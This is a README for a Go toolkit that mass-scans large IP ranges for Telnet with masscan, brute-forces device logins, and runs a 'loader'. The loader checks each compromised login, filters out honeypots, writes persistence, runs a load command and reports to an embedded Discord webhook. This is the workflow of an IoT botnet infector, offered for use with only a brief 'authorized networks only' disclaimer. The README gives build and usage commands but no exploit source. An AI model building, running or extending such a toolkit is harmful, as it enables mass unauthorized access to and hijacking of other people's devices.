# scanner

Telnet discovery, brute-force, and verified loader toolkit (Go module). See also `tutoriel.txt` for extended notes.

## Structure

```
scanner/
├── go.mod
└── cmd/
    ├── scanner/       # Masscan wrapper → open port 23
    ├── telnetbrute/   # Credential brute
    └── loader/        # 6-step validation + webhook notify
```

## 1. Scanner

Wraps **masscan** for Telnet (`/8` ranges in source; writes `masscan_results_telnet.txt`).

```bash
go build -o scanner ./cmd/scanner
./scanner
```

Requires `masscan` in `$PATH`.

## 2. Telnet brute

```bash
go build -o telnetbrute ./cmd/telnetbrute
./telnetbrute <ip_list.txt> <threads> <output_file>
```

Output: `IP:23 user:pass`

## 3. Loader

```bash
go build -o loader ./cmd/loader
./loader <list.txt>
```

Input lines:

```
192.168.1.1:23 root:root
```

### Verification pipeline

| Step | Check |
|------|--------|
| 1 | Login |
| 2 | Real device (honeypot filter) |
| 3 | Shell echo test |
| 4 | Persistence write/read |
| 5 | Login consistency |
| 6 | Load command + notify |

**Remove embedded Discord webhook** in `cmd/loader/main.go` before GitHub.

## Disclaimer

Authorized networks only.
